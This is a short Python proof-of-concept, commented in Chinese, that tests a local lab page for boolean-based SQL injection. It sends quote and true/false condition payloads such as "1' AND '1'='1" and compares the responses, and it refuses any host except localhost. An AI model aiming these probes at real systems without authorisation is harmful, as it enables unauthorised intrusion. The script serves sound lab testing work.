#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-001 本地授权靶场最小验证草案。

只对 localhost/127.0.0.1/::1 发起请求，不跟随重定向，不导出数据库内容。
用法示例：
  python sqli-001-poc.py --base-url http://127.0.0.1:8080/Less-1/ --param id
"""

import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def validate_base_url(raw):
    parts = urllib.parse.urlsplit(raw)
    if parts.scheme not in ("http", "https"):
        raise ValueError("仅允许 http/https，实际为: %r" % (parts.scheme,))
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise ValueError("仅允许本地授权地址 %s，实际主机: %r" % (sorted(ALLOWED_HOSTS), host))
    if not parts.path:
        raise ValueError("URL 缺少路径")
    return raw


def request_once(opener, base_url, param, payload, timeout):
    query = urllib.parse.urlencode({param: payload})
    url = base_url + ("&" if "?" in base_url else "?") + query
    req = urllib.request.Request(url, headers={"User-Agent": "sqli-001-lab-poc/1.0"})
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(262144).decode("utf-8", "replace")
            return {"kind": "response", "status": resp.status, "url": url, "body": body, "error": None}
    except urllib.error.HTTPError as exc:
        body = exc.read(262144).decode("utf-8", "replace") if exc.fp else ""
        kind = "redirect" if 300 <= exc.code < 400 else "http_error"
        return {"kind": kind, "status": exc.code, "url": url, "body": body, "error": str(exc)}
    except urllib.error.URLError as exc:
        return {"kind": "connection_error", "status": None, "url": url, "body": "", "error": str(exc.reason)}
    except TimeoutError as exc:
        return {"kind": "timeout", "status": None, "url": url, "body": "", "error": str(exc)}


def has_user_row(body):
    return ("Your Login name:" in body) or ("Your Password:" in body)


def summarize(label, payload, result):
    body = result["body"]
    print("[%s] payload=%r" % (label, payload))
    print("    kind=%s status=%s" % (result["kind"], result["status"]))
    if result["error"]:
        print("    error=%s" % result["error"])
    print("    user_row_signature=%s" % has_user_row(body))
    markers = ("SQL syntax", "mysql_fetch_array", "Warning:", "You have an error")
    print("    sql_error_marker=%s" % any(m in body for m in markers))
    print("    body_length=%d" % len(body))


def main(argv=None):
    parser = argparse.ArgumentParser(description="SQLI-001 本地最小 SQL 注入验证草案")
    parser.add_argument("--base-url", required=True, help="本地靶场页面完整 URL，仅限 localhost/127.0.0.1/::1")
    parser.add_argument("--param", default="id", help="注入参数名，默认 id")
    parser.add_argument("--timeout", type=float, default=5.0, help="单次请求超时秒数，默认 5")
    args = parser.parse_args(argv)

    try:
        base_url = validate_base_url(args.base_url)
    except ValueError as exc:
        print("参数错误: %s" % exc, file=sys.stderr)
        return 2

    opener = urllib.request.build_opener(NoRedirect)
    probes = [
        ("baseline", "1"),
        ("quote_only", "1'"),
        ("true_condition", "1' AND '1'='1"),
        ("false_condition", "1' AND '1'='2"),
    ]

    results = {}
    for label, payload in probes:
        result = request_once(opener, base_url, args.param, payload, args.timeout)
        results[label] = result
        summarize(label, payload, result)

    base_sig = has_user_row(results["baseline"]["body"])
    true_sig = has_user_row(results["true_condition"]["body"])
    false_sig = has_user_row(results["false_condition"]["body"])

    print("")
    print("对照结论（仅供人工复核，不是自动化漏洞定性）:")
    print("  baseline 用户行: %s" % base_sig)
    print("  true 条件用户行: %s" % true_sig)
    print("  false 条件用户行: %s" % false_sig)
    if not base_sig:
        print("  [环境] 基线未出现用户行：检查 URL/参数/部署状态，不能据此判断漏洞。")
    if true_sig and not false_sig:
        print("  [观察] true 与 false 条件响应不同：存在布尔注入线索，需人工复核。")
    else:
        print("  [观察] 未观察到 true/false 差异：当前条件无证据，需排查过滤或环境。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
